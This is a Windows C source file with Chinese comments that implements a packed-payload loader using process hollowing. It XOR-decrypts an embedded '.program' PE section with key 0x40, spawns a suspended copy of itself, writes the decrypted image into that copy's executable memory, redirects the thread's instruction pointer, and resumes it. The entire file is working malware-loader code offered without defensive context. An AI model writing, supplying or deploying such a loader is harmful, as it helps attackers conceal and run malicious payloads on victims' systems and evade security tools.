#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

void xor_decrypt(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

int main() {
    printf("hello program2！\n");

    // 获取句柄
    HMODULE self = GetModuleHandle(NULL);
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)self;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)((char*)self + dos->e_lfanew);

    // 查找 .program 节区
    IMAGE_SECTION_HEADER* prog_sec = NULL;
    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
        if (memcmp(section->Name, ".program", 8) == 0) {
            prog_sec = section;
            break;
        }
    }

    size_t data_size = prog_sec->SizeOfRawData;
    unsigned char* decrypted_data = (unsigned char*)malloc(data_size);
    memcpy(decrypted_data, (unsigned char*)self + prog_sec->VirtualAddress, data_size);
    xor_decrypt(decrypted_data, data_size, 0x40);

    // 创建挂起进程
    WCHAR exe_path[MAX_PATH];
    GetModuleFileNameW(NULL, exe_path, MAX_PATH);
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(NULL, exe_path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // 在目标进程分配内存并写入数据
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)decrypted_data;
    IMAGE_NT_HEADERS64* nt_header = (IMAGE_NT_HEADERS64*)(decrypted_data + dos_header->e_lfanew);
    
    LPVOID new_base = VirtualAllocEx(pi.hProcess, (LPVOID)nt_header->OptionalHeader.ImageBase, nt_header->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 写入PE头
    WriteProcessMemory(pi.hProcess, new_base, decrypted_data, nt_header->OptionalHeader.SizeOfHeaders, NULL);

    // 写入各个节区
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt_header);
    for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->SizeOfRawData > 0) {
            LPVOID sec_addr = (LPVOID)((char*)new_base + sec->VirtualAddress);
            WriteProcessMemory(pi.hProcess, sec_addr, decrypted_data + sec->PointerToRawData, sec->SizeOfRawData, NULL);
        }
    }

    // 设置入口点
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_ALL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rip = (ULONG_PTR)new_base + nt_header->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    
    ResumeThread(pi.hThread);

    free(decrypted_data);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return 0;
}

